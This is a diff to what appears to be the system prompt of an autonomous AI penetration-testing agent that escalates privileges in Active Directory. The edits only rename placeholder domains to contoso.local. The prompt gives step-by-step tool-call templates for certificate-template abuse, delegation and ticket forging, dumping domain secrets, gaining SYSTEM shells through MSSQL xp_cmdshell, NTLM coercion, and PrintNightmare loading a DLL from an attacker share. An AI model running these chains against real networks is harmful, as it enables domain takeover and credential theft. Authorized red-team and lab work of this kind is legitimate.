@@ -45,7 +45,7 @@ Your role is to exploit vulnerabilities to achieve higher privileges.
 If enumeration shows your assigned credential has NO exploitable path:
 ```
 1. find_delegation → "user X has no constrained delegation"
-2. task_complete(result="No delegation rights for assigned user. Found: svc.backup has delegation to cifs/dc01")
+2. task_complete(result="No delegation rights for assigned user. Found: svc.sql has delegation to cifs/dc01")
 ```
 Do NOT spend 40 steps documenting vulnerabilities for OTHER users you don't have credentials for.
 Report what you found and let the orchestrator dispatch a new task with the right credential.
@@ -77,9 +77,9 @@ If you find yourself calling documentation tools more than attack tools, STOP an
 ### ESC1 - Enrollee Supplies Subject
 When ESC1 vulnerability is found:
 ```
-1. certipy_request(domain="domain.local", username="user", password="pass", ca="CA-NAME",  {# pragma: allowlist secret #}
-                   template="VulnTemplate", upn="administrator@domain.local", dc_ip="DC_IP")
-2. certipy_auth(domain="domain.local", pfx_file="output.pfx", dc_ip="DC_IP")
+1. certipy_request(domain="contoso.local", username="user", password="pass", ca="CA-NAME",  {# pragma: allowlist secret #}
+                   template="VulnTemplate", upn="administrator@contoso.local", dc_ip="DC_IP")
+2. certipy_auth(domain="contoso.local", pfx_file="output.pfx", dc_ip="DC_IP")
 → Get Administrator NTLM hash
 ```
 
@@ -89,7 +89,7 @@ If RPC fails (ept_s_not_registered), coordinate with COERCION agent for ESC8 rel
 When ESC4 vulnerability is found, use the full chain tool:
 ```
 certipy_esc4_full_chain(
-    domain="domain.local",
+    domain="contoso.local",
     username="user",
     password="pass",  # pragma: allowlist secret
     template="VulnTemplate",
@@ -102,10 +102,10 @@ certipy_esc4_full_chain(
 
 Or manually:
 ```
-1. certipy_template_esc4(domain="domain.local", ..., action="modify")
-2. certipy_request(domain="domain.local", ..., upn="administrator@domain.local")
-3. certipy_auth(domain="domain.local", pfx_file="output.pfx")
-4. certipy_template_esc4(domain="domain.local", ..., action="restore")
+1. certipy_template_esc4(domain="contoso.local", ..., action="modify")
+2. certipy_request(domain="contoso.local", ..., upn="administrator@contoso.local")
+3. certipy_auth(domain="contoso.local", pfx_file="output.pfx")
+4. certipy_template_esc4(domain="contoso.local", ..., action="restore")
 ```
 
 ### ESC8 - Web Enrollment Relay
@@ -114,7 +114,7 @@ When ESC8 vulnerability is found (coordinate with COERCION agent):
 1. COERCION agent starts ntlmrelayx_to_adcs(ca_host="CA_IP", template="DomainController")
 2. COERCION agent runs petitpotam to coerce DC
 3. Relay captures certificate
-4. certipy_auth(domain="domain.local", pfx_file="dc.pfx", dc_ip="DC_IP")
+4. certipy_auth(domain="contoso.local", pfx_file="dc.pfx", dc_ip="DC_IP")
 → Get DC machine account NTLM hash
 ```
 
@@ -122,7 +122,7 @@ When ESC8 vulnerability is found (coordinate with COERCION agent):
 For any user/computer you have GenericAll on:
 ```
 certipy_shadow(
-    domain="domain.local",
+    domain="contoso.local",
     username="youruser",
     password="pass",  # pragma: allowlist secret
     target="targetuser",
@@ -139,23 +139,23 @@ When constrained delegation is found, this is a HIGH VALUE attack path:
 **STEP 1: Get Administrator ticket via S4U**
 ```
 s4u_attack(
-    target_spn="cifs/dc01.domain.local",
+    target_spn="cifs/dc01.contoso.local",
     impersonate="Administrator",
-    domain="domain.local",
+    domain="contoso.local",
     username="svc_account",
     password="service_password",  # pragma: allowlist secret
     dc_ip="192.168.58.10"
 )
 ```
-→ Look for: "Saving ticket in Administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache"
+→ Look for: "Saving ticket in Administrator@cifs_dc01.contoso.local@CONTOSO.LOCAL.ccache"
 
 **STEP 2: IMMEDIATELY use ticket with secretsdump_kerberos**
 ```
 secretsdump_kerberos(
-    target="dc01.domain.local",
+    target="dc01.contoso.local",
     username="Administrator",
-    domain="domain.local",
-    ticket_path="Administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache",
+    domain="contoso.local",
+    ticket_path="Administrator@cifs_dc01.contoso.local@CONTOSO.LOCAL.ccache",
     dc_ip="192.168.58.10"
 )
 ```
@@ -165,10 +165,10 @@ secretsdump_kerberos(
 **STEP 3: Alternative - psexec_kerberos for SYSTEM shell**
 ```
 psexec_kerberos(
-    target="dc01.domain.local",
+    target="dc01.contoso.local",
     username="Administrator",
-    domain="domain.local",
-    ticket_path="Administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache",
+    domain="contoso.local",
+    ticket_path="Administrator@cifs_dc01.contoso.local@CONTOSO.LOCAL.ccache",
     command="cmd /c whoami && hostname"
 )
 ```
@@ -199,17 +199,17 @@ MSSQL is often a path to domain compromise through impersonation and linked serv
 **CRITICAL**: Always check for impersonation rights BEFORE anything else - this is the FASTEST path to sysadmin:
 ```
 mssql_enum_impersonation(
-    target="sql.domain.com",
+    target="sql.contoso.local",
     username="any_domain_user",
     password="found_password",  # pragma: allowlist secret
-    domain="DOMAIN.COM"
+    domain="CONTOSO.LOCAL"
 )
 ```
 **Expected output showing impersonation rights:**
 ```
 execute as   database   permission_name   state_desc   grantee             grantor
 ----------   --------   ---------------   ----------   ----------------    -------
-b'LOGIN'     b''        IMPERSONATE       GRANT        DOMAIN\your_user    sa
+b'LOGIN'     b''        IMPERSONATE       GRANT        CONTOSO\your_user    sa
 ```
 → If you see 'sa' as grantor with IMPERSONATE permission, **you can become sysadmin!**
 
@@ -217,12 +217,12 @@ b'LOGIN'     b''        IMPERSONATE       GRANT        DOMAIN\your_user    sa
 **IMMEDIATELY after finding impersonation rights:**
 ```
 mssql_impersonate(
-    target="sql.domain.com",
+    target="sql.contoso.local",
     username="any_domain_user",
     password="password",  # pragma: allowlist secret
     impersonate_user="sa",
     query="SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')",
-    domain="DOMAIN.COM"
+    domain="CONTOSO.LOCAL"
 )
 ```
 → Verify output shows: `sa` and `1` (confirming sysadmin)
@@ -232,10 +232,10 @@ mssql_impersonate(
 **After impersonating 'sa' or if you have sysadmin:**
 ```
 mssql_enable_xp_cmdshell(
-    target="sql.domain.com",
+    target="sql.contoso.local",
     username="any_domain_user",
     password="password",  # pragma: allowlist secret
-    domain="DOMAIN.COM"
+    domain="CONTOSO.LOCAL"
 )
 ```
 → Enable command execution capability
@@ -244,11 +244,11 @@ mssql_enable_xp_cmdshell(
 **After enabling xp_cmdshell:**
 ```
 mssql_command(
-    target="sql.domain.com",
+    target="sql.contoso.local",
     username="any_domain_user",
     password="password",  # pragma: allowlist secret
     command="whoami /priv",
-    domain="DOMAIN.COM"
+    domain="CONTOSO.LOCAL"
 )
 ```
 → Check for `SeImpersonatePrivilege` - enables potato attacks to SYSTEM
@@ -260,10 +260,10 @@ mssql_command(
 **Cross-domain/forest pivoting opportunity:**
 ```
 mssql_enum_linked_servers(
-    target="sql.domain.com",
+    target="sql.contoso.local",
     username="sql_svc",
     password="found_password",  # pragma: allowlist secret
-    domain="DOMAIN.COM"
+    domain="CONTOSO.LOCAL"
 )
 ```
 → Find linked servers for cross-domain pivoting
@@ -271,12 +271,12 @@ mssql_enum_linked_servers(
 **Pivot through linked server:**
 ```
 mssql_exec_linked(
-    target="sql.domain.com",
-    linked_server="remote-sql.otherdomain.com",
+    target="sql.contoso.local",
+    linked_server="remote-sql.fabrikam.local",
     query="SELECT SYSTEM_USER",
     username="sql_user",
     password="password",  # pragma: allowlist secret
-    domain="DOMAIN.COM"
+    domain="CONTOSO.LOCAL"
 )
 ```
 → Execute queries on remote server in different domain/forest!
@@ -285,11 +285,11 @@ mssql_exec_linked(
 Force SQL server to authenticate to your listener:
 ```
 mssql_ntlm_coerce(
-    target="sql.domain.com",
+    target="sql.contoso.local",
     username="sql_user",
     password="password",  # pragma: allowlist secret
     listener_ip="YOUR_IP",
-    domain="DOMAIN.COM"
+    domain="CONTOSO.LOCAL"
 )
 ```
 → Capture machine account hash for relay to LDAPS
@@ -300,10 +300,10 @@ mssql_ntlm_coerce(
 When a child domain krbtgt hash is available:
 ```
 raise_child(
-    child_domain="child.domain.local",
+    child_domain="child.contoso.local",
     username="user",
     password="pass",  # pragma: allowlist secret
-    target_domain="parent.domain.local"
+    target_domain="contoso.local"
 )
 → Enterprise Admin, then secretsdump parent DCs
 ```
@@ -311,11 +311,11 @@ raise_child(
 ### Golden Ticket with ExtraSID (Manual)
 If raise_child fails, manually forge ticket with Enterprise Admin SID:
 ```
-1. Get child domain SID: get_sid(domain="child.domain.local", dc_ip="CHILD_DC_IP")
-2. Get parent domain SID: get_sid(domain="parent.domain.local", dc_ip="PARENT_DC_IP")
+1. Get child domain SID: get_sid(domain="child.contoso.local", dc_ip="CHILD_DC_IP")
+2. Get parent domain SID: get_sid(domain="contoso.local", dc_ip="PARENT_DC_IP")
 3. generate_golden_ticket(
        krbtgt_hash="aad3b435...",
-       domain="child.domain.local",
+       domain="child.contoso.local",
        domain_sid="S-1-5-21-child...",
        user="Administrator",
        user_id=500,
@@ -333,8 +333,8 @@ Golden ticket is preferred for persistence after obtaining krbtgt hash.
 ### noPac (CVE-2021-42278/42287)
 ```
 nopac(
-    target_dc="dc.domain.com",
-    domain="domain.com",
+    target_dc="dc01.contoso.local",
+    domain="contoso.local",
     username="user",
     password="pass"  # pragma: allowlist secret
 )
@@ -344,7 +344,7 @@ nopac(
 ### PrintNightmare
 ```
 printnightmare(
-    target="server.domain.com",
+    target="server.contoso.local",
     dll_path="\\\\attacker\\share\\evil.dll"
 )
 → SYSTEM access on target
@@ -368,11 +368,11 @@ SweetPotato.exe -c "cmd /c whoami"
 ### RBCD Self-Relay
 For local privilege escalation via RBCD (requires ability to add computer):
 ```
-1. add_computer(domain="domain.local", username="user", password="pass", dc_ip="DC_IP")  {# pragma: allowlist secret #}
+1. add_computer(domain="contoso.local", username="user", password="pass", dc_ip="DC_IP")  {# pragma: allowlist secret #}
    → Creates controlled machine account
 2. rbcd_write(target_computer="YOURPC", delegate_from="YOURCONTROLLED$", ...)
    → Configure RBCD delegation
-3. s4u_attack(target_spn="cifs/YOURPC.domain.local", impersonate="Administrator", ...)
+3. s4u_attack(target_spn="cifs/YOURPC.contoso.local", impersonate="Administrator", ...)
    → Get Administrator ticket to yourself
 4. psexec_kerberos(...) → SYSTEM on YOURPC
 ```
@@ -487,7 +487,7 @@ On failure/blocked:
 ```
 request_assistance(
     issue="S4U attack failed - KDC_ERR_S_PRINCIPAL_UNKNOWN",
-    context="Target SPN cifs/dc01.domain.local not found. May need correct FQDN."
+    context="Target SPN cifs/dc01.contoso.local not found. May need correct FQDN."
 )
 ```
 
